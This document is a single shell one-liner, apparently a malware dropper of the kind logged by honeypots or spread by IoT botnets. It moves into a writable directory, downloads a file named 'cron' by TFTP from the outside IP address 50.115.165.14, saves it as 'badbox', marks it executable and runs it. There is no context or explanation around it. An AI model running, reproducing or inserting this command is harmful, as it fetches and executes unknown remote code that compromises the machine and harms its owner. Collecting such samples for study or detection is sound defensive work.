cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 50.115.165.14 -c get cron;cat cron >badbox;chmod +x *;./badbox
